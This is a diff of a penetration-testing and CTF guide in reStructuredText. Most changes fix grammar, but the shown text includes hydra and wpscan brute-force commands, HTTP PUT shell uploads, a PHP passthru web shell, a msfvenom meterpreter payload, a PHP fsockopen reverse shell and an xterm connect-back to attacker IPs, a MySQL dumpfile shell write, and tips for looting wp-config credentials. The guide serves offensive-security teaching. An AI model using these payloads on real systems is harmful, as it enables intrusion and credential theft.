@@ -293,7 +293,7 @@ There will be some days, when you won't find vulnerability with searchsploit. In
 Google-Vulns
 ------------
 
-It is suggested that whenever you are googling something,  you add words such as vulnerability, exploit,ctf, github, python, tool etc. For example. Let's say, you are stuck in a docker or on a specific cms. Search for docker ctf or <cms_name> ctf/ github etc.
+It is suggested that whenever you are googling something,  you add words such as vulnerability, exploit, ctf, github, python, tool etc. to your searchterm. For example. Let's say, you are stuck in a docker or on a specific cms search for docker ctf or <cms_name> ctf/ github etc.
 
 Webservices
 -----------
@@ -313,7 +313,8 @@ Utilize whatweb to find what software stack a server is running.
 
 nikto
 ^^^^^
-nikto - Scan web server for known vulnerabilities. It would examine a web server to find potential problems and security vulnerabilities, including:
+nikto - Scans a web server for known vulnerabilities. 
+It will examine a web server to find potential problems and security vulnerabilities, including:
 
 * Server and software misconfigurations
 * Default files and programs
@@ -323,28 +324,30 @@ nikto - Scan web server for known vulnerabilities. It would examine a web server
 BurpSuite Spider
 ^^^^^^^^^^^^^^^^
 
-There would be some cases where dirb/ dirbuster won't find anything. Happened with us on a Node.js web application. Burpsuite spider helped in finding extra-pages which contained the credentials.
+There will be some cases when dirb/ dirbuster doesn't find anything. This happened with us on a Node.js web application. Burpsuite's spider helped in finding extra-pages which contained credentials.
 
 dirb, wfuzz, dirbuster
 ^^^^^^^^^^^^^^^^^^^^^^
 
-Further, we can execute to find any hidden directories.
+Furthermore, we can run the folling programs to find any hidden directories.
 
-* `DIRB <https://tools.kali.org/web-applications/dirb>`_ is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary basesd attack against a web server and analizing the response.
-* `wfuzz <https://tools.kali.org/web-applications/wfuzz>`_ - a web application bruteforcer. Wfuzz might be useful when you are looking for webpage of a certain size. For example: Let's say, when we dirb we get 50 directories. Each directory containing a image. Most of the time, now we need to figure out which image is different. Here, we would figure out what's the size of the normal image and hide that particular response with wfuzz.
+* `DIRB <https://tools.kali.org/web-applications/dirb>`_ is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analizing the response.
+* `wfuzz <https://tools.kali.org/web-applications/wfuzz>`_ - a web application bruteforcer. Wfuzz might be useful when you are looking for webpage of a certain size. For example: Let's say, when we dirb we get 50 directories. Each directory containing an image. Most of the time, we then need to figure out which image is different. In this case, we would figure out what's the size of the normal image and hide that particular response with wfuzz.
 * `Dirbuster <https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project>`_ : DirBuster is a multi threaded java application designed to brute force directories and files names on web/ application servers. 
 
-.. Tip :: If the using the dirb/ wfuzz wordlist doesn't result in any directories and the website contains a lot of text, it might be a good idea to use cewl to create a wordlist and utilize that as a dictionary to find hidden directories.
+.. Tip :: If using the dirb/ wfuzz wordlist doesn't result in any directories and the website contains a lot of text, it might be a good idea to use cewl to create a wordlist and utilize that as a dictionary to find hidden directories.
 
-.. Tip :: Probably, we would be using common.txt in /usr/share/wordlists/dirb/ . If it's doesn't find anything, it's better to double check with /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt which is list of directories that where found on at least 2 different hosts when DirBuster project crawled the internet. Even if that doesn't work out, try searching with extensions .txt, .js, .html, .php. (.txt by default and rest application based)
+.. Tip :: Probably, we will be using common.txt ( /usr/share/wordlists/dirb/ ) . If it's doesn't find anything, it's better to double check with /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt which is a list of directories that where found on at least 2 different hosts when DirBuster project crawled the internet. Even if that doesn't work out, try searching with extensions such as .txt, .js, .html, .php. (.txt by default and rest application based)
 
+**TODO: gobuster ??**
 
 PUT Method
 ^^^^^^^^^^
 
-Sometimes, it is also a good option to check for the various OPTIONS available on the website such as GET, PUT, DELETE etc.
+Sometimes, it is also a good option to check for the various HTTP verbs that are availble such as GET, PUT, DELETE, etc.
+This can be done by making an OPTIONS request.
 
-Curl command can be used to check the options available:
+Curl can be used to check the available options (supported http verbs):
 
 ::
 
@@ -367,9 +370,9 @@ Curl command can be used to check the options available:
   <
   * Connection #0 to host 192.168.126.129 left intact
 
-The put method allows you to upload a file. Eventually, you can upload a php file which can work as a shell. There are multiple methods to upload the file as mentioned in `Detecting and exploiting the HTTP Put Method <http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html>`_ 
+The PUT method allows you to upload a file. Which can help use to get a shell on the machine. There are multiple methods availble for uploading a file with the PUT method mentioned on `Detecting and exploiting the HTTP Put Method <http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html>`_ 
 
-The few are
+A few are:
 
 * Nmap:
 
@@ -392,7 +395,7 @@ The few are
 Wordpress
 ^^^^^^^^^
 
-When running wpscan, also make sure you run \-\-enumerate u for enumerating usernames. By default wpscan doesn't run it. Also, scan for plugins
+When faced with a website that makes use of the wordpress CMS one can run wpscan. Make sure you run \-\-enumerate u for enumerating usernames because by default wpscan doesn't run it. Also, scan for plugins
 
 ::
 
@@ -413,20 +416,26 @@ When running wpscan, also make sure you run \-\-enumerate u for enumerating user
     	Multiple values are allowed : "-e tt,p" will enumerate timthumbs and plugins
     	If no option is supplied, the default is "vt,tt,u,vp"
 
-Wordpress configuration is stored in wp-config.php. If you are able to download it, you might get username and password to database. We can also use wordpress to bruteforce password for a username 
+We can also use wordpress to bruteforce password for a username 
 
 ::
 
   wpscan --url http://192.168.1.2 --wordlist wordlist.txt --username example_username
 
+The configuration of worpdress is normally speaking stored in wp-config.php. If you are able to download it, you might be luckiy and be able to loot plaintext username and passwords to database or wp-admin page. 
+
 .. Tip :: If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible way is to do Appearance > Editor > Possibly edit 404 Template.
 
-.. Tip :: If there's exists a SQL-Injection, by which we are able to extract wordpress user and password hash. However, password hash is not crackable. Probably, check the wp-posts table as it might contain some hidden posts.
+.. Tip :: If the website is vulnerable for SQL-Injection. We should be able to extract the wordpress users and their password hashes. Since hashing is a one-way function they are not directly crackable. Hence you would need to know the hash the was used itsel (hash-identifier) and run plaintext through said hash and check if you find a match with an "stolen" password hash. An alternative and somewhat easier way is to google the hash itself. 
 
-Names? Possible Usernames? Possible Passwords?
-^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+**todo: elborate more on wp scanning and vulnerabilities?**
+
+Names? Possible Usernames & Passwords?
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    
-Sometimes, on visiting the webpage of the webserver (If Vulnerable machine is running any http/ https webserver), you would find possible  names of the employees working in the company. Now, it is common practice to have username based on your first/ last name. Superkojiman has written a script `namemash.py <https://gist.githubusercontent.com/superkojiman/11076951/raw/8b0d545a30fd76cb7808554b1c6e0e26bc524d51/namemash.py>`_ which could be used to create possible usernames. However, we still have a large amount of  usernames to bruteforce with passwords. Further, if the vulnerable machine is running a SMTP mail server, we can verify if the particular username exists or not and modify namemash.py to generate usernames for that pattern.
+Sometimes, when visiting webpages, you will find possible names of the employees working in the company. It is common practice to have a username based on your first/ last name. Superkojiman has written a script `namemash.py <https://gist.githubusercontent.com/superkojiman/11076951/raw/8b0d545a30fd76cb7808554b1c6e0e26bc524d51/namemash.py>`_ which could be used to create possible usernames. However, then we are left with a large amount of potential usernames with no passwords.
+
+If the vulnerable machine is running a SMTP mail server, we can verify if the particular username exists or not and modify namemash.py to generate usernames for that pattern.
 
 * Using metasploit smtp\_enum module: Once msfconsole is running, use auxiliary/scanner/smtp/smtp\_enum, enter the RHOSTS (target address) and USER FILE containing the list of probable user accounts.
 * Using VRFY command:
@@ -439,8 +448,8 @@ Hydra can be used to brute force login web pages
 
 ::
 
-  -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE
-  -p PASS  or -P FILE try password PASS, or load several passwords from FILE
+  -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE  (userlist)
+  -p PASS  or -P FILE try password PASS, or load several passwords from FILE  (passwordlist)
   -U        service module usage details
   -e nsr additional checks, "n" for null password, "s" try login as pass, "r" try the reverse login as pass
 
@@ -461,18 +470,18 @@ By default this module is configured to follow a maximum of 5 redirections in a 
   Syntax:   <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
 
 * First is the page on the server to GET or POST to (URL).
-* Second is the POST/GET variables (taken from either the browser, proxy, etc. with usernames and passwords being replaced in the "^USER^" and "^PASS^" placeholders (FORM PARAMETERS)
+* Second is the POST/GET variables (taken from either the browser, proxy, etc. with usernames and passwords being replaced with the "^USER^" and "^PASS^" placeholders (FORM PARAMETERS)
 * Third is the string that it checks for an *invalid* login (by default) Invalid condition login check can be preceded by "F=", successful condition login check must be preceded by "S=". This is where most people get it wrong. You have to check the webapp what a failed string looks like and put it in this parameter!
 * The following parameters are optional:
   C=/page/uri     to define a different page to gather initial cookies from
-  (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request	^USER^ and ^PASS^ can also be put into these headers!
+  (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request ^USER^ and ^PASS^ can also be put into these headers!
 
  * Note: 
 
-  * 'h' will add the user-defined header at the end	regardless it's already being sent by Hydra or not.
+  * 'h' will add the user-defined header at the end regardless it's already being sent by Hydra or not.
   * 'H' will replace the value of that header if it exists, by the one supplied by the user, or add the header at the end
 
- * Note that if you are going to put colons (:) in your headers you should escape them with a backslash (\). All colons that are not option separators should be escaped (see the examples above and below). You can specify a header without escaping the colons, but that way you will not be able to put colons in the header value itself, as they will be interpreted by hydra as option separators.
+ * Note that if you are going to put colons (:) in your headers you should escape them with a backslash (\). All colons that aren't option separators should be escaped (see the examples above and below). You can specify a header without escaping the colons, but that way you will not be able to put colons in the header value itself, as they will be interpreted by hydra as option separators.
 
 Examples:
 
@@ -484,11 +493,12 @@ Examples:
  "/:user=^USER&pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^"
  "/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:reason=:C=/exchweb"
 
+**TODO ncrack?**
 
 Reverse Shells
 --------------
 
-Possibly, we would have figured out some vulnerablity in the services running or misconfiguration and can have a reverse shell using netcat, php, weevely, ruby, perl, python, java, jsp, bash tcp, Xterm, Lynx, Mysql. Mostly taken from `PentestMonkey Reverse shell cheat sheet <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>`_  and `Reverse Shell Cheat sheet from HighOn.Coffee <https://highon.coffee/blog/reverse-shell-cheat-sheet/>`_ and some more.
+Possibly, we would have figured out some vulnerablity or misconfiguration in the running services which allows us to have a reverse shell using netcat, php, weevely, ruby, perl, python, java, jsp, bash tcp, Xterm, Lynx, Mysql. Mostly taken from `PentestMonkey Reverse shell cheat sheet <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>`_  and `Reverse Shell Cheat sheet from HighOn.Coffee <https://highon.coffee/blog/reverse-shell-cheat-sheet/>`_ and more.
 
 netcat (nc)
 ^^^^^^^^^^^
@@ -528,7 +538,7 @@ PHP
 
    <? passthru($_GET["cmd"]); ?>
 
- which can be accessed by
+ which can then be accessed by
 
  :: 
 
@@ -562,19 +572,21 @@ PHP
 
  We can create a php meterpreter shell, run a exploit handler on msf, upload the payload on the server and wait for the connection.
 
+**todo explain how to set up a multi handler**
+
  ::
 
   msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o /tmp/payload.php
 
 * **PHP Reverse Shell**
 
- PHP Trick: This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6
+ The code below assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6
 
  :: 
 
   php -r '$sock=fsockopen("192.168.56.101",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
 
- The above can be connected by listening at port 1337 by using nc
+ The above can be connected to by listening on port 1337 by using nc
 
 Weevely
 ^^^^^^^
@@ -591,7 +603,7 @@ which can be called by
 
   weevely http://192.168.1.2/location_of_payload password
 
-However, it wasn't as useful as php meterpreter or reverse shell.
+However, it wasn't as useful as php meterpreter or a reverse shell.
 
 
 Ruby
@@ -717,7 +729,7 @@ Telnet Reverse Shell
 XTerm
 ^^^^^
 
-One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.
+One of the simplest forms of reverse shell is an xterm session. The following command should be run on the victim server. It will try to connect back to you (10.0.0.1) on TCP port 6001.
 
 .. code-block :: bash 
 
@@ -739,7 +751,8 @@ You’ll need to authorize the target to connect to you (command also run on you
 Lynx
 ^^^^
 
-Obtain an interactive shell through lynx: It is possible to obtain an interactive shell via special LYNXDOWNLOAD URLs. This is a big security hole for sites that use lynx "guest accounts" and other public services. More details `LynxShell <http://insecure.org/sploits/lynx.download.html>`_ 
+Obtain an interactive shell through lynx: It is possible to obtain an interactive shell via special LYNXDOWNLOAD URLs. 
+This is a big security hole for sites that use lynx "guest accounts" and other public services. More details `LynxShell <http://insecure.org/sploits/lynx.download.html>`_ 
 
 When you start up a lynx client session, you can hit "g" (for Goto) and then enter the following URL:
 
@@ -763,7 +776,7 @@ MYSQL
  
   SELECT "<?php passthru($_GET['cmd']); ?>" into dumpfile '/var/www/html/shell.php';
 
-* If you have sql-shell from sqlmap/ phpmyadmin, we can use
+* If you have sql-shell from sqlmap/ phpmyadmin, we can read files by using the load_file function.
 
  :: 
 	
@@ -775,7 +788,7 @@ Reverse Shell from Windows
 If there's a way, we can execute code from windows, we may try
 
 * Powershell Empire/ Metasploit Web-Delivery Method
-* Invoke-Shellcode 
+* Invoke-Shellcode (from powersploit)
 
  ::
 
@@ -952,7 +965,6 @@ Probably will get
  standard in must be a tty
 
 The su command would work from a terminal, however, would not take in raw stuff via the shell's Standard Input.
-
 We can use a shell terminal trick that relies on Python to turn our non-terminal shell into a terminal shell
 
 ::
@@ -967,7 +979,7 @@ Spawning a Fully Interactive TTYs Shell
 
 `Ronnie Flathers <https://twitter.com/ropnop>`_ has already written a great blog on `Upgrading simple shells to fully interactive TTYs <https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/>`_ Hence, almost everything is taken from that blog and kept here for completion purposes.
 
-Many times, we would not get a fully interactive shell which means 
+Many times, we will not get a fully interactive shell therefor it will/have: 
 
 * Difficult to use the text editors like vim
 * No tab-complete
@@ -993,7 +1005,7 @@ On Victim (launch):
 
 If socat isn't installed, download standalone binaries that can be downloaded from `static binaries <https://github.com/andrew-d/static-binaries>`_ 
 
-Download the correct architecture socat binary to a writable directoy, chmod it, then execute
+Download the correct binary architecture of socat to a writable directoy, chmod it, execute
 
 stty
 ^^^^
@@ -1001,8 +1013,7 @@ stty
 Use the methods mentioned in :ref:`spawning-a-tty-shell`
 
 Once bash is running in the PTY, background the shell with Ctrl-Z
-
-While the shell is in the background, now examine the current terminal and STTY info so we can force the connected shell to match it
+While the shell is in the background, examine the current terminal and STTY info so we can force the connected shell to match it
 
 ::
  
@@ -1019,10 +1030,9 @@ While the shell is in the background, now examine the current terminal and STTY 
  opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
  isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
 
-
 The information needed is the TERM type ("xterm-256color") and the size of the current TTY ("rows 38; columns 116")
 
-With the shell still backgrounded, now set the current STTY to type raw and tell it to echo the input characters with the following command:
+With the shell still backgrounded, set the current STTY to type raw and tell it to echo the input characters with the following command:
 
 ::
 
